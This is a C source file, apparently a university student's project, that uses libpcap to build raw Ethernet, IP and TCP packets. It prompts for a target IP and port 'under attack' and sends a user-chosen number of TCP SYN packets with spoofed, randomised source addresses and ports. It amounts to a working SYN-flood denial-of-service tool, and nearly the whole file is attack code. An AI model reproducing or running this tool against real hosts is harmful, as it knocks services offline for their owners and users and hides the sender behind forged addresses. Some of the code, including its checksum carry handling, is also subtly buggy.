/* File Name: TCPgeneration
 * Author: Gu Gyo Hyean
 * E-mail Address: rygus9@ajou.ac.kr
 * Description: packet generation program
 * Last Changed: 2020-06-10
*/

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#pragma warning(disable:4996)

#include<pcap.h>
#include<stdio.h>
#include<stdlib.h>
#include<time.h>

#define SNAPLEN   1514
#define ETH_ALEN 6
#define IP_ALEN 4
#define ETH_P_IP 0x0800
#define IP_LEN 20
#define TCP_OPT_LEN 12
#define TCP_LEN 32
#define TOTLEN 66  //fixed because packet has no variable length data

//Ethernet Protocol
struct ethhdr {
    unsigned char h_dest[ETH_ALEN];
    unsigned char h_source[ETH_ALEN];
    unsigned short h_proto;
};

//IP header no option
struct iphdr {
    unsigned char ihl : 4;
    unsigned char version : 4;
    unsigned char tos;
    u_short tot_len;
    u_short id;
    u_short frag_off;
    u_char ttl;
    u_char protocol;
    u_short check;
    unsigned int saddr;
    unsigned int daddr;
};

struct pseudo_header    //for checksum calculation 
{
    uint32_t source_address; // source IP address
    uint32_t dest_address; // dest. IP address 
    uint8_t  placeholder; // all zeros 
    uint8_t  protocol; // upper layer protocol at IP layer 
    uint16_t length; // length of transport layer header
};

//TCP header append option
struct tcphdr {
    u_short p_source;
    u_short p_dest;
    u_long seq_num;
    u_long ack_num;
    unsigned char zero1 : 4;
    unsigned char thl : 4;
    unsigned char syn : 6;
    unsigned char zero2 : 2;
    u_short window;
    u_short checksum;
    u_short point;

    //option field 12 byte
    unsigned char tcp_option[TCP_OPT_LEN];
};

//mac address
unsigned char src_mac[ETH_ALEN] = { 0x70, 0xC9, 0x4E, 0x55, 0x19, 0x6F }; 
unsigned char dest_mac[ETH_ALEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }; //fix this when you send packet

//functions about building packet in each layer
void build_Ethernet_Header(u_char* msg, unsigned short type, int* offset);
void build_IP_Header(u_char* msg, int* offset, char* ip);
void build_TCP_Header(u_char* msg, int* offset, int port);

int main() {
    //randomizing source IP and source port
    srand(time(NULL));

    pcap_t* adhandle;
    pcap_if_t* alldevs, * d;

    char errbuf[PCAP_ERRBUF_SIZE];
    int i = 0;
    int offset = 0;
    int ndNum = 0;
    int devNum;
    u_char msg[1500];

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "not open device list %s\n", errbuf);
        exit(1);
    }

    //scan device
    for (d = alldevs; d; d = d->next) {
        printf("%d, %s ", ++ndNum, d->name);
        if (d->description) {
            printf(" (%s) \n", d->description);
        }
        else {
            printf("(No description available) \n");
        }
    }

    //no device
    if (ndNum == 0) {
        printf("\n no device\n");
        return -1;
    }
    
    //select device 
    printf("input interface number (1-%d)", ndNum);
    scanf("%d", &devNum);

    if (devNum < 1 || devNum > ndNum) {
        printf("\ninvalid input..\n");
        pcap_freealldevs(alldevs);
        return -1;
    }

    for (d = alldevs, i = 0; i < devNum - 1; d = d->next, i++);

    if ((adhandle = pcap_open_live(d->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
        fprintf(stderr, "\n not available device \n");
        pcap_freealldevs(alldevs);
        return -1;
    }

    printf("\nuse device\n\n", d->description);

    //remove device list
    pcap_freealldevs(alldevs);

    //input ip and port about device under attack
    char attack_ip[20]; while (getchar() == NULL);
    printf("Enter the ip of the target.\n");
    fgets(attack_ip, sizeof(attack_ip), stdin);


    int end = strlen(attack_ip);
    attack_ip[end] = '\0';

    int attack_port = 0;
    printf("Enter the port of the target.\n");
    scanf("%d", &attack_port);

    int syn_pkt;
    printf("How many send packet\n");
    scanf("%d", &syn_pkt);

    //Send packets as many as the number you receive 
    for (i = 0; i < syn_pkt; i++) {
        offset = 0;
        memset(msg, 0, sizeof(msg));
        build_Ethernet_Header(msg, ETH_P_IP, &offset);
        build_IP_Header(msg, &offset, attack_ip);
        build_TCP_Header(msg, &offset, attack_port);
        pcap_sendpacket(adhandle, msg, TOTLEN);
    }

    pcap_close(adhandle);
    printf("send complete!! \n");

    return 0;
}

/*
build Ethernet_Header 
input : u_char *msg(packet buffer), unsigned short type(Ethernet type), offset(pointer about Ethernet protocol in packet buffer);
outbput : none;
This function fills the buffer with Ethernet protocol
*/
void build_Ethernet_Header(u_char* msg, unsigned short type, int* offset)
{
    struct ethhdr* eth;
    int i;

    eth = (struct ethhdr*)msg + *offset;
    // ethernet header
    for (i = 0; i < ETH_ALEN; i++) eth->h_dest[i] = dest_mac[i];  // destination MAC address (6 bytes)
    for (i = 0; i < ETH_ALEN; i++) eth->h_source[i] = src_mac[i];  // source MAC address (6 bytes)
    eth->h_proto = htons(type);                              // type: 0x0806 (ARP)

    *offset += sizeof(struct ethhdr);
}

/*
ip_checksum
input : pointer of ip layer in packet, iphsize
outbput : unsigned short checksum
This function returns ip_checksum
*/
unsigned short ip_checksum(u_short* iph, int iphsize) {
    int total_add_count = iphsize / 2;
    unsigned int total_sum = 0;

    for (int i = 0; i < total_add_count; i++) {
        total_sum += ntohs(iph[i]);
    }

    u_short lower = total_sum & 0x0000ffff;
    u_short upper = ((total_sum & 0xffff0000) >> 16);

    total_sum = (unsigned int)lower + (unsigned int)upper;
    if (total_sum > 65535) {
        u_short lower = total_sum & 0x0000ffff;
        u_short upper = ((total_sum & 0xffff0000) >> 16);
    }

    u_short ret_sum = lower + upper;
    ret_sum = ~ret_sum;

    return ret_sum;
}

/*
build_IP_Header
input : u_char *msg(packet buffer), offset(pointer about ip protocol in packet buffer), char* ip(destination ip)
outbput : none;
This function fills the buffer with IP protocol
*/
void build_IP_Header(u_char* msg, int* offset, char* ip) {
    struct iphdr* iph;

    iph = (struct iphdr*)(msg + *offset);

    iph->version = 4;
    iph->ihl = 5; // no option 
    iph->tos = 0;
    iph->tot_len = htons(TOTLEN - 14); // iphdr + transhdr + data 
    iph->id = htons(19392);
    iph->frag_off = 1 << 6; // no fragmentation 
    iph->ttl = 128; // hops 
    iph->protocol = IPPROTO_TCP; // upper layer 
    iph->check = 0; // initially 0 
    iph->saddr = inet_addr("172.30.1.43"); // sourc IP address
    ((unsigned char*)&(iph->saddr))[3] = rand() % 254 + 1;
    iph->daddr = inet_addr(ip); // destination IP address
    /* Calculate IP checksum on completed header */
    iph->check = htons(ip_checksum((u_short*)iph, sizeof(struct iphdr)));

    *offset += sizeof(struct iphdr);
}

/*
build_TCP_Header
input : u_char *msg(packet buffer), offset(pointer about ip protocol in packet buffer), int port
outbput : none;
This function fills the buffer with TCP protocol
*/
void build_TCP_Header(u_char* msg, int* offset, int port) {
    struct tcphdr* tcph;
    struct iphdr* iph;

    iph = (struct iphdr*)(msg + 14);
    tcph = (struct tcphdr*)(msg + *offset);

    tcph->p_source = htons((unsigned short)(rand() % 10000 + 50000)); // random
    tcph->p_dest = htons(port); //receiver port
    tcph->seq_num = htonl(874396352); //any value ok
    tcph->ack_num = 0;
    tcph->thl = 8;
    tcph->zero1 = 0;
    tcph->zero2 = 0;
    tcph->syn = 2;
    tcph->window = htons(64240);
    tcph->checksum = 0;
    tcph->point = 0;


    //put option
    tcph->tcp_option[0] = 2;
    tcph->tcp_option[1] = 4;
    *(u_short*)&(tcph->tcp_option[2]) = htons(1460);

    tcph->tcp_option[4] = 1;
    tcph->tcp_option[5] = 3;
    tcph->tcp_option[6] = 3;
    tcph->tcp_option[7] = 8;

    tcph->tcp_option[8] = 1;
    tcph->tcp_option[9] = 1;
    tcph->tcp_option[10] = 4;
    tcph->tcp_option[11] = 2;

    //calculate tcp check sum
    struct pseudo_header* psh;

    psh = (struct pseudo_header*)malloc(sizeof(struct pseudo_header));
    psh->source_address = iph->saddr;
    psh->dest_address = iph->daddr;
    psh->placeholder = 0;
    psh->protocol = iph->protocol;
    psh->length = htons(32);

    int totalsum = 0;

    for (int i = 0; i < 6; i++) {
        totalsum += ntohs(((u_short*)psh)[i]);
    }

    for (int i = 0; i < 16; i++) {
        totalsum += ntohs(((u_short*)tcph)[i]);
    }

    int lower = totalsum & 0x0000ffff;
    int upper = (totalsum & 0xffff0000) >> 16;
    int total = lower + upper;

    if (total > 65535) {
        lower = total & 0x0000ffff;
        upper = (total & 0xffff0000) >> 16;
        total = lower + upper;
    }

    u_short real_total = (u_short)total;

    real_total = ~real_total;

    tcph->checksum = htons(real_total);
}